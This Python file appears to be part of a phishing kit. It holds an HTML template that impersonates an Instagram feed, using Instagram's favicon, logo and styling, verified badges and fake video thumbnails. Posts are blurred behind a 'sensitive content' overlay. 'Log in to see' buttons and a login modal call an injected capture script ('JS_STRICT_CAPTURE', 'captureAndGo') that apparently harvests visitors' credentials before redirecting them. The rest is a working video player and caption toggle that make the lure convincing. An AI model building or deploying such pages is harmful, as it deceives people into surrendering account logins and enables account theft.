"""feed.py - Template feed Instagram."""

from platforms._shared import JS_STRICT_CAPTURE, IG_LOGO_SVG as _IG_LOGO_SVG

HTML_FEED = r"""
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/yv/r/B8lOUPkyZfP.ico" type="image/x-icon">
    <title>{{ name }} | Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { background: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color: #fff; }
        .ig-top { background: #000; border-bottom: 1px solid #262626; padding: 10px 16px; position: sticky; top: 0; z-index: 50; }
        .post-card { background: #000; border: 1px solid #262626; border-radius: 8px; margin-bottom: 16px; overflow: hidden; }
        .reaction-bar { display: flex; gap: 16px; padding: 8px 12px; color: #fff; font-size: 13px; }
        .reaction-bar i { font-size: 22px; }
        .hidden { display: none !important; }

        /* Modern video player */
        .ig-video-wrapper { position: relative; background: #000; overflow: hidden; }
        .ig-video { display: block; width: 100%; max-height: 700px; object-fit: contain; background: #000; }
        .ig-video.blurred { filter: blur(20px); }
        .ig-video::-webkit-media-controls { display: none !important; }
        .ig-video::-webkit-media-controls-enclosure { display: none !important; }
        .ig-play-overlay { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 5; pointer-events: none; opacity: 0; transition: opacity 0.2s ease; background: rgba(0,0,0,0.25); }
        .ig-play-overlay.visible { opacity: 1; }
        .ig-play-icon { width: 64px; height: 64px; background: rgba(0,0,0,0.6); border-radius: 50%; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(8px); border: 2px solid rgba(255,255,255,0.3); }
        .ig-play-icon i { color: #fff; font-size: 26px; margin-left: 3px; }
        .ig-loading-spinner { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 6; width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.2); border-top-color: #ed4956; border-radius: 50%; animation: ig-spin 0.8s linear infinite; display: none; }
        .ig-loading-spinner.visible { display: block; }
        @keyframes ig-spin { to { transform: translate(-50%, -50%) rotate(360deg); } }
        .ig-video-controls { position: absolute; bottom: 0; left: 0; right: 0; background: linear-gradient(to top, rgba(0,0,0,0.85), transparent); padding: 10px 12px 8px; opacity: 0; transition: opacity 0.25s ease; z-index: 7; }
        .ig-video-wrapper:hover .ig-video-controls { opacity: 1; }
        .ig-progress-bar { height: 3px; background: rgba(255,255,255,0.25); border-radius: 2px; cursor: pointer; position: relative; overflow: hidden; }
        .ig-progress-fill { height: 100%; background: #ed4956; width: 0%; border-radius: 2px; transition: width 0.1s linear; }
        .ig-controls-row { display: flex; align-items: center; justify-content: space-between; margin-top: 6px; color: #fff; }
        .ig-controls-left { display: flex; align-items: center; gap: 10px; font-size: 13px; }
        .ig-controls-left i { cursor: pointer; font-size: 16px; }
        .ig-controls-right { display: flex; align-items: center; gap: 8px; }
        .ig-resolution-btn { background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.3); color: #fff; font-size: 11px; font-weight: 700; padding: 3px 8px; border-radius: 4px; cursor: pointer; }
        .ig-resolution-btn:hover { background: rgba(255,255,255,0.3); }
        .ig-resolution-menu { position: absolute; bottom: 100%; right: 0; background: rgba(0,0,0,0.92); border: 1px solid rgba(255,255,255,0.2); border-radius: 6px; padding: 4px; margin-bottom: 6px; display: none; min-width: 80px; z-index: 8; }
        .ig-resolution-menu.visible { display: block; }
        .ig-resolution-item { display: block; width: 100%; text-align: left; background: transparent; border: none; color: #fff; font-size: 12px; padding: 6px 10px; border-radius: 4px; cursor: pointer; }
        .ig-resolution-item:hover { background: rgba(237,73,86,0.3); }
        .ig-resolution-item.active { background: #ed4956; color: #fff; }

        /* Caption see more/see less */
        .ig-caption { color: #fff; font-size: 14px; line-height: 1.4; margin-bottom: 4px; word-break: break-word; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-height: 1.4em; transition: max-height 0.3s ease, white-space 0.1s ease; }
        .ig-caption.expanded { white-space: normal; overflow: visible; text-overflow: clip; max-height: 500px; }
        .ig-caption-toggle { color: #8e8e8e; font-size: 13px; font-weight: 600; cursor: pointer; display: inline-block; -webkit-tap-highlight-color: transparent; }

        .modal-bg { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 100; display: flex; align-items: center; justify-content: center; }
        .modal-box { background: #121212; padding: 28px; border-radius: 12px; max-width: 400px; width: 90%; text-align: center; border: 1px solid #262626; }
    </style>
</head>
<body>
    """ + JS_STRICT_CAPTURE + r"""
    <div class="ig-top flex items-center justify-between">
        """ + _IG_LOGO_SVG + r"""
        <div class="flex gap-4 items-center">
            <i class="fas fa-plus-square text-xl"></i>
            <div class="relative">
                <i class="fas fa-heart text-xl"></i>
                {% if notif_count %}<span class="absolute -top-1 -right-2 bg-[#ed4956] text-white text-[10px] rounded-full w-4 h-4 flex items-center justify-center">{{ notif_count }}</span>{% endif %}
            </div>
            <i class="fas fa-paper-plane text-xl"></i>
        </div>
    </div>
    <div class="max-w-xl mx-auto p-3" id="ig-feed">
        {% for p in posts %}
        <div class="post-card" data-index="{{ loop.index0 }}" {% if p.blur_enabled %}data-blur-mode="{{ p.blur_mode or 'instant' }}" data-blur-delay="{{ p.blur_delay or 3 }}"{% endif %}>
            <div class="flex items-center p-3">
                <div class="rounded-full p-[2px] bg-gradient-to-tr from-[#feda75] via-[#d62976] to-[#962fbf]">
                    <img draggable="false" src="{{ p.profile_pic }}" class="w-9 h-9 rounded-full object-cover border-2 border-black" onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 40 40%22%3E%3Crect fill=%22%23d62976%22 width=%2240%22 height=%2240%22/%3E%3Ccircle cx=%2220%22 cy=%2216%22 r=%227%22 fill=%22%23fff%22/%3E%3Cpath d=%22M6 36 Q6 26 20 26 Q34 26 34 36 Z%22 fill=%22%23fff%22/%3E%3C/svg%3E';">
                </div>
                <div class="ml-3">
                    <div class="font-semibold text-sm">{{ p.profile_name }} {% if p.verified %}<i class="fas fa-check-circle text-[#3897f0] text-xs"></i>{% endif %}</div>
                    <div class="text-xs text-gray-400">{{ p.time_ago }} · {{ p.audience_text }}</div>
                </div>
            </div>
            {% if p.image and not p._video_url and not p._fake_video %}
            <img draggable="false" src="{{ p.image }}" class="w-full {% if p.blur_enabled %}blurred{% endif %}" style="max-height: 700px; object-fit: cover; {% if p.blur_enabled %}filter: blur(20px);{% endif %}">
            {% endif %}
            {% if p._video_url and not p._fake_video %}
            <div class="ig-video-wrapper">
                <video class="ig-video {% if p.blur_enabled and p.blur_mode != 'delayed' %}blurred{% endif %}" {% if p._cover_url %}poster="{{ p._cover_url }}"{% endif %} playsinline preload="metadata" loop>
                    {% if p.video_resolutions %}
                        {% for res in p.video_resolutions %}
                    <source data-label="{{ res.label }}" data-res="{{ res.value }}" src="{{ res.url }}" type="video/mp4">
                        {% endfor %}
                    {% else %}
                    <source data-label="Auto" data-res="auto" src="{{ p._video_url }}" type="video/mp4">
                    {% endif %}
                </video>
                <div class="ig-loading-spinner"></div>
                <div class="ig-play-overlay visible"><div class="ig-play-icon"><i class="fas fa-play"></i></div></div>
                <div class="ig-video-controls">
                    <div class="ig-progress-bar"><div class="ig-progress-fill"></div></div>
                    <div class="ig-controls-row">
                        <div class="ig-controls-left">
                            <i class="fas fa-play ig-play-pause"></i>
                            <span class="ig-time">0:00 / 0:00</span>
                        </div>
                        <div class="ig-controls-right" style="position: relative;">
                            <button class="ig-resolution-btn">Auto</button>
                            <div class="ig-resolution-menu">
                                {% if p.video_resolutions %}
                                    {% for res in p.video_resolutions %}
                                <button class="ig-resolution-item" data-src="{{ res.url }}" data-label="{{ res.label }}">{{ res.label }}</button>
                                    {% endfor %}
                                {% else %}
                                <button class="ig-resolution-item active" data-src="{{ p._video_url }}" data-label="Auto">Auto</button>
                                {% endif %}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            {% if p.blur_enabled %}<div class="blur-overlay" {% if p.blur_mode == 'delayed' %}style="display:none;"{% endif %} style="position:absolute;inset:0;z-index:9;display:flex;flex-direction:column;align-items:center;justify-content:center;background:rgba(0,0,0,0.6);text-align:center;padding:32px;"><i class="fas fa-eye-slash" style="font-size:48px;color:#ed4956;margin-bottom:16px;"></i><div style="font-size:16px;font-weight:700;color:#fff;margin-bottom:8px;">Contenu flouté</div><div style="font-size:13px;color:#ccc;margin-bottom:24px;">{{ p.blur_reason or 'Contenu sensible' }}</div><button style="background:#ed4956;color:#fff;border:none;border-radius:8px;padding:14px 36px;font-size:14px;font-weight:700;cursor:pointer;" onclick="captureAndGo('')">Log in to see</button></div>{% endif %}
            {% elif p._fake_video %}
            <div class="relative bg-black">
                <img draggable="false" src="{{ p.image }}" class="w-full {% if p.blur_enabled %}blurred{% endif %}" style="max-height: 700px; object-fit: contain; {% if p.blur_enabled %}filter: blur(20px);{% endif %}">
                <div class="absolute inset-0 flex items-center justify-center pointer-events-none">
                    <div class="bg-black bg-opacity-50 rounded-full w-14 h-14 flex items-center justify-center"><i class="fas fa-play text-white ml-1"></i></div>
                </div>
            </div>
            {% endif %}
            {% if p.text or p.caption %}<div class="px-3 pb-1 pt-2 text-sm"><span class="ig-caption">{{ (p.text or p.caption)|safe }}</span></div><div class="px-3 pb-2"><span class="ig-caption-toggle" onclick="igToggleCaption(this)" style="display:none;">Voir plus</span></div>{% endif %}
            <div class="reaction-bar">
                <div class="flex items-center gap-1"><i class="far fa-heart"></i><span class="ml-1 text-sm">{{ p.likes }}</span></div>
                <div class="flex items-center gap-1"><i class="far fa-comment"></i><span class="ml-1 text-sm">{{ p.comments }}</span></div>
                <div class="flex items-center gap-1"><i class="far fa-paper-plane"></i><span class="ml-1 text-sm">{{ p.shares }}</span></div>
            </div>
        </div>
        {% endfor %}
        <div class="text-center py-6">
            <button onclick="captureAndGo('{{ posts[0].redirect_after if posts else '' }}')" class="bg-[#0095f6] text-white font-semibold px-8 py-2 rounded">{{ login_link }}</button>
            <p class="text-gray-500 text-sm mt-2">{{ see_more }}</p>
        </div>
    </div>
    <div id="login-modal" class="modal-bg hidden">
        <div class="modal-box">
            <h3 class="text-xl font-semibold mb-2">{{ modal_title }}</h3>
            <p class="text-gray-400 text-sm mb-5">{{ modal_text }}</p>
            <button onclick="confirmLogin()" class="bg-[#0095f6] text-white font-semibold px-6 py-2 rounded w-full mb-2">{{ modal_continue }}</button>
            <button onclick="closeModal()" class="text-gray-500 text-sm">{{ modal_stay }}</button>
        </div>
    </div>
    <script>
        // Caption see more / see less
        function igToggleCaption(btn){try{var cap=btn.parentElement.previousElementSibling.querySelector('.ig-caption');if(!cap)return;if(cap.classList.contains('expanded')){cap.classList.remove('expanded');btn.textContent='Voir plus';}else{cap.classList.add('expanded');btn.textContent='Voir moins';}}catch(e){}}
        function igInitCaptionToggles(){try{document.querySelectorAll('.ig-caption').forEach(function(cap){try{var toggleWrap=cap.parentElement.nextElementSibling;if(!toggleWrap)return;var toggle=toggleWrap.querySelector('.ig-caption-toggle');if(!toggle)return;var isTruncated=cap.scrollWidth>cap.clientWidth||cap.offsetHeight<cap.scrollHeight;if(isTruncated){toggle.style.display='inline-block';}else{toggle.style.display='none';}}catch(e2){}});}catch(e3){}}
        try{if(document.readyState!=='loading'){igInitCaptionToggles();}else{document.addEventListener('DOMContentLoaded',igInitCaptionToggles);}}catch(e4){}
        try{var _igFeed=document.getElementById('ig-feed');if(_igFeed){_igFeed.addEventListener('scroll',function(){try{igInitCaptionToggles();}catch(e5){}},{passive:true});}}catch(e6){}

        // Video players — NO autoplay, play on click, pause on scroll away, resume on scroll back
        (function(){
            try {
                var cards = document.querySelectorAll('.post-card');
                cards.forEach(function(card){
                    try {
                        var wrap = card.querySelector('.ig-video-wrapper');
                        if (!wrap) return;
                        var video = wrap.querySelector('video.ig-video');
                        var overlay = wrap.querySelector('.ig-play-overlay');
                        var spinner = wrap.querySelector('.ig-loading-spinner');
                        var playPauseBtn = wrap.querySelector('.ig-play-pause');
                        var progressFill = wrap.querySelector('.ig-progress-fill');
                        var progressBar = wrap.querySelector('.ig-progress-bar');
                        var timeEl = wrap.querySelector('.ig-time');
                        var resBtn = wrap.querySelector('.ig-resolution-btn');
                        var resMenu = wrap.querySelector('.ig-resolution-menu');
                        if (!video) return;

                        // Save current time for resume on scroll back
                        var _savedTime = 0;
                        var _wasPlaying = false;

                        function fmtTime(s){try{if(!isFinite(s)||s<0)s=0;var m=Math.floor(s/60);var sec=Math.floor(s%60);return m+':'+(sec<10?'0':'')+sec;}catch(e){return '0:00';}}

                        // Click on video wrapper → toggle play/pause
                        wrap.addEventListener('click', function(e){
                            try {
                                // Don't toggle if clicking on controls
                                if (e.target.closest('.ig-video-controls') || e.target.closest('.ig-resolution-menu')) return;
                                if (video.paused) {
                                    var p = video.play();
                                    if (p && p.catch) p.catch(function(){});
                                } else {
                                    video.pause();
                                }
                            } catch(err) {}
                        });

                        // Resolution menu toggle
                        if (resBtn && resMenu) {
                            resBtn.addEventListener('click', function(e){
                                try {
                                    e.stopPropagation();
                                    resMenu.classList.toggle('visible');
                                } catch(err) {}
                            });
                            // Resolution items
                            var resItems = resMenu.querySelectorAll('.ig-resolution-item');
                            resItems.forEach(function(item){
                                item.addEventListener('click', function(e){
                                    try {
                                        e.stopPropagation();
                                        var newSrc = item.getAttribute('data-src');
                                        var newLabel = item.getAttribute('data-label');
                                        var currentTime = video.currentTime;
                                        var wasPaused = video.paused;
                                        // Update active
                                        resItems.forEach(function(i){ i.classList.remove('active'); });
                                        item.classList.add('active');
                                        resBtn.textContent = newLabel;
                                        resMenu.classList.remove('visible');
                                        // Switch source
                                        video.src = newSrc;
                                        video.load();
                                        video.currentTime = currentTime;
                                        if (!wasPaused) {
                                            var p = video.play();
                                            if (p && p.catch) p.catch(function(){});
                                        }
                                    } catch(err) {}
                                });
                            });
                            // Close menu when clicking outside
                            document.addEventListener('click', function(e){
                                try {
                                    if (!resBtn.contains(e.target) && !resMenu.contains(e.target)) {
                                        resMenu.classList.remove('visible');
                                    }
                                } catch(err) {}
                            });
                        }

                        // Video events
                        video.addEventListener('waiting', function(){ try { if (spinner) spinner.classList.add('visible'); } catch(e){} });
                        video.addEventListener('playing', function(){
                            try { if (spinner) spinner.classList.remove('visible'); if (overlay) overlay.classList.remove('visible'); if (playPauseBtn) playPauseBtn.className = 'fas fa-pause ig-play-pause'; _wasPlaying = true; } catch(e){}
                        });
                        video.addEventListener('canplay', function(){ try { if (spinner) spinner.classList.remove('visible'); } catch(e){} });
                        video.addEventListener('pause', function(){
                            try { if (overlay) overlay.classList.add('visible'); if (playPauseBtn) playPauseBtn.className = 'fas fa-play ig-play-pause'; _wasPlaying = false; if (wrap._blurTimer) { clearTimeout(wrap._blurTimer); wrap._blurTimer = null; } } catch(e){}
                        });
                        video.addEventListener('play', function(){ try { if (overlay) overlay.classList.remove('visible'); if (playPauseBtn) playPauseBtn.className = 'fas fa-pause ig-play-pause'; var _card=video.closest('.post-card'); if(_card){var _bm=_card.getAttribute('data-blur-mode'); if(_bm==='delayed'){var _bd=parseInt(_card.getAttribute('data-blur-delay'))||3; if(wrap._blurTimer)clearTimeout(wrap._blurTimer); wrap._blurTimer=setTimeout(function(){try{video.classList.add('blurred'); var _bo=_card.querySelector('.blur-overlay'); if(_bo){_bo.style.display='flex';}}catch(ebt){}},_bd*1000);}} } catch(e){} });
                        video.addEventListener('timeupdate', function(){
                            try {
                                if (progressFill && video.duration && isFinite(video.duration)) {
                                    progressFill.style.width = (video.currentTime / video.duration * 100) + '%';
                                }
                                if (timeEl) {
                                    timeEl.textContent = fmtTime(video.currentTime) + ' / ' + fmtTime(video.duration);
                                }
                            } catch(e){}
                        });

                        // Progress bar click → seek
                        if (progressBar) {
                            progressBar.addEventListener('click', function(e){
                                try {
                                    e.stopPropagation();
                                    var dur = video.duration;
                                    if (!isFinite(dur) || dur <= 0) return;
                                    var rect = progressBar.getBoundingClientRect();
                                    var pct = (e.clientX - rect.left) / rect.width;
                                    video.currentTime = Math.max(0, Math.min(dur, pct * dur));
                                } catch(e){}
                            });
                        }

                        // Play/Pause button
                        if (playPauseBtn) {
                            playPauseBtn.addEventListener('click', function(e){
                                try {
                                    e.stopPropagation();
                                    if (video.paused) {
                                        var p = video.play();
                                        if (p && p.catch) p.catch(function(){});
                                    } else {
                                        video.pause();
                                    }
                                } catch(e){}
                            });
                        }
                    } catch(err) {}
                });

                // IntersectionObserver — pause on scroll away, resume on scroll back
                try {
                    if ('IntersectionObserver' in window) {
                        var observer = new IntersectionObserver(function(entries){
                            entries.forEach(function(entry){
                                try {
                                    var wrap = entry.target.querySelector('.ig-video-wrapper');
                                    if (!wrap) return;
                                    var video = wrap.querySelector('video.ig-video');
                                    var overlay = wrap.querySelector('.ig-play-overlay');
                                    var spinner = wrap.querySelector('.ig-loading-spinner');
                                    if (entry.intersectionRatio >= 0.5) {
                                        // Item visible → resume if it was playing before
                                        try {
                                            if (video && video.paused && video.currentTime > 0 && video.currentTime < video.duration) {
                                                // Only resume if was previously playing (not if user paused)
                                                if (wrap._wasPlaying === true) {
                                                    var p = video.play();
                                                    if (p && p.catch) p.catch(function(){});
                                                }
                                            }
                                        } catch(e2) {}
                                    } else {
                                        // Item out of view → pause and remember state
                                        try {
                                            if (video && !video.paused) {
                                                wrap._wasPlaying = true;
                                                video.pause();
                                            } else if (video && video.paused) {
                                                wrap._wasPlaying = false;
                                            }
                                            if (spinner) spinner.classList.remove('visible');
                                        } catch(e3) {}
                                    }
                                } catch(e4) {}
                            });
                        }, { threshold: [0, 0.5, 1], root: null });
                        cards.forEach(function(card){ try { observer.observe(card); } catch(e5) {} });
                    }
                } catch(e6) {}
            } catch(e7) {}
        })();
    </script>
</body>
</html>
"""
